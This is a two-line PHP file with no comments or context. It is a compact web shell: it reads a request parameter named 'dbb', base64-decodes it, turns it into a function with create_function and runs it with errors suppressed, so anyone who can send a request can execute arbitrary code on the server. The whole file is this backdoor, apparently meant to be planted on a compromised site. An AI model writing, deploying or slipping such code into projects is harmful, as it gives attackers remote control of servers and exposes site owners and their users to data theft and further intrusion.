<?php
if(!empty($_REQUEST['dbb'])){$dbb=base64_decode($_REQUEST['dbb']);$dbb=create_function('',$dbb);@$dbb();exit;}